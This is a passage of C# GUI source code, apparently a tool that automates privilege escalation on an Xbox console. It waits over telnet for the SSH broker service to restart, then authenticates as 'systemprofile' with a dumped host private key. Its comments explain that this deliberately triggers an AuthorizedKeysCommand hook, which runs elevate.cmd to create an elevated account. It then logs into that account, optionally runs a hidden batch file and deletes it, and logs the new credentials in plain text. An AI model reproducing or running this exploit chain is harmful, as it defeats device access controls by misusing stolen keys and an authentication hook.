            {
                bool sshdBrokerFound = false;
                bool telnetConnectionEstablished = false;
                DateTime startTime = DateTime.Now;

                while (!sshdBrokerFound && (DateTime.Now - startTime).TotalMinutes < 3)
                {
                    if (telnetClient.IsConnected)
                    {
                        // Log the "Telnet connection established" message only once
                        if (!telnetConnectionEstablished)
                        {
                            Debug.WriteLine("Telnet connection established");
                            telnetConnectionEstablished = true;

                            // Wait for the shell prompt from the console
                            string shellPrompt = await telnetClient.TerminatedReadAsync("C:\\Windows\\System32>", TimeSpan.FromSeconds(5));
                        }

                        // tlist -s allows us to find the correct svchost (SshdBroker)
                        // tlist -v works too, but requires more parsing of the output
                        await telnetClient.WriteLineRfc854Async("tlist -s");

                        string output = await telnetClient.ReadAsync(TimeSpan.FromSeconds(10));
                        string[] lines = output.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);

                        foreach (string line in lines)
                        {
                            if (line.Contains("svchost.exe") && line.Contains("SshdBroker"))
                            {
                                sshdBrokerFound = true;
                                break;
                            }
                        }
                    }

                    if (!sshdBrokerFound)
                    {
                        await Task.Delay(3000);
                    }
                }

                async Task RestartConsole()
                {
                    MessageBoxResult result =
                        HandyControl.Controls.MessageBox.Show("Restart Console?", "Restart", MessageBoxButton.YesNo);

                    if (result == MessageBoxResult.Yes)
                    {
                        var workingDirectory = Directory.GetCurrentDirectory();
                        var xboxWdpDriverPath = Path.Combine(workingDirectory, "Scratch", "WDP", "XboxWDPDriver.exe");

                        string? wdpUsername = HasWdpCredentials ? WDPCredentials.WdpUsername : null;
                        string? wdpPassword = HasWdpCredentials ? WDPCredentials.WdpPassword : null;

                        string rebootCommand = $"{xboxWdpDriverPath} /x:{hostnameOrIp} /op:reboot";
                        if (!string.IsNullOrEmpty(wdpUsername) && !string.IsNullOrEmpty(wdpPassword))
                        {
                            rebootCommand += $" /user:{wdpUsername} /pwd:{wdpPassword}";
                        }

                        var processStartInfo = new ProcessStartInfo("cmd", $"/c {rebootCommand}")
                        {
                            RedirectStandardOutput = true,
                            UseShellExecute = false,
                            CreateNoWindow = true
                        };

                        var process = Process.Start(processStartInfo);
                        var tcs = new TaskCompletionSource<bool>();

                        process.Exited += (sender, e) => tcs.SetResult(true);
                        process.EnableRaisingEvents = true;

                        await tcs.Task;
                        string rebootOutput = process.StandardOutput.ReadToEnd();

                        if (rebootOutput.Contains("Rebooting device."))
                        {
                            await _log.InformationAsync("Initiated reboot of the console");
                            await Task.Delay(3000);

                            StepViewModel VM = ViewModel;
                            VM.StepIndex = 0;
                            MyRichTextBox.Document = new FlowDocument();

                            await StepOne();
                            return;
                        }

                        else
                        {
                            await _log.ErrorAsync($"{rebootOutput}");
                        }
                    }
                }

                // Check if less than 5 seconds have elapsed since we began waiting
                // If the service is back up this early, expect imminent failure
                if ((DateTime.Now - startTime).TotalSeconds < 5)
                {
                    XSVGPath.Visibility = Visibility.Hidden;
                    await _log.ErrorAsync("Less than 5 seconds have elapsed");
                    await _log.ErrorAsync("On occasion, Sshd will almost immediately respawn");
                    await _log.ErrorAsync("When this happens, we'll never properly invoke AKC");

                    await RestartConsole();
                    return;
                }

                // Check if more than 3 minutes have elapsed without finding SshdBroker
                // Due to how we forcefully terminate Sshd via WDP, we get one solid restart from the service
                // Otherwise, we end up waiting indefinitely
                if (!sshdBrokerFound)
                {
                    XSVGPath.Visibility = Visibility.Hidden;
                    await _log.ErrorAsync("Failed to find SshdBroker within 3 minutes");
                    await _log.ErrorAsync("Sshd will not come back unless manually restarted");

                    await RestartConsole();
                    return;
                }
            }

            await _log.InformationAsync("SshdBroker process found");
            XSVGPath.Visibility = Visibility.Hidden;

            string username = "systemprofile";
            string keyFilePath = Path.Combine(Directory.GetCurrentDirectory(), "Scratch", "SSHDump", "ssh_host_ed25519_key");

            var keyFile = new PrivateKeyFile(keyFilePath);
            var connectionInfo = new ConnectionInfo(hostnameOrIp, username, new PrivateKeyAuthenticationMethod(username, keyFile));

            await _log.InformationAsync("Invoking AKC");

            SshClient? ssh = null;

            try
            {
                // systemprofile .ssh (authorized_keys) --> sshd_config AKC --> elevate.cmd
                ssh = new SshClient(connectionInfo);
                ssh.Connect();
            }

            catch (SshAuthenticationException ex)
            {
                // Expected exception
                // If we don't reach this, assume something has gone awry
                await _log.InformationAsync("Executed AKC");

                try
                {
                    using (var client = new SshClient(hostnameOrIp, elevateUser, elevatePass))
                    {
                        client.Connect();

                        if (VeilSwitch.IsChecked == true)
                        {
                            client.RunCommand(@"cmd /c D:\DevelopmentFiles\veil.bat");
                            client.RunCommand(@"cmd /c del D:\DevelopmentFiles\veil.bat");
                        }

                        client.Disconnect();
                        await _log.InformationAsync($"Credentials validated");
                    }
                }

                catch (Exception e)
                {
                    // Rare exception, user wasn't properly created
                    // However, we should be able to cycle SSH once more
                    await _log.ErrorAsync($"Failed to login with credentials of {elevateUser}:{elevatePass}: {e.Message}");

                    MessageBoxResult result =
                        HandyControl.Controls.MessageBox.Show("Restart Process?", "Restart", MessageBoxButton.YesNo);

                    if (result == MessageBoxResult.Yes)
                    {
                        StepViewModel VM = ViewModel;
                        VM.StepIndex = 0;
                        MyRichTextBox.Document = new FlowDocument();

                        await StepOne();
                        return;
                    }

                    else
                    {
                        return;
                    }
                }
            }

            finally
            {
                if (ssh != null)
                {
                    ssh.Disconnect();
                    ssh.Dispose();
                }
            }

            await _log.InformationAsync($"Credentials of {elevateUser}:{elevatePass} created successfully");

            StepViewModel viewModel = ViewModel;
            viewModel.NextStep();
            await _log.InformationAsync("Process complete");
        }

        private void StartButton_Click(object sender, RoutedEventArgs e)
        {
            _ = StepOne();
        }

        private void StopButton_Click(object sender, RoutedEventArgs e)
        {
            // Access the view model
            StepViewModel viewModel = ViewModel;

            if (viewModel != null)
            {
                viewModel.StepIndex = 0;
                MyRichTextBox.Document = new FlowDocument();
            }

            else
            {
                return;
            }
        }
    }
}
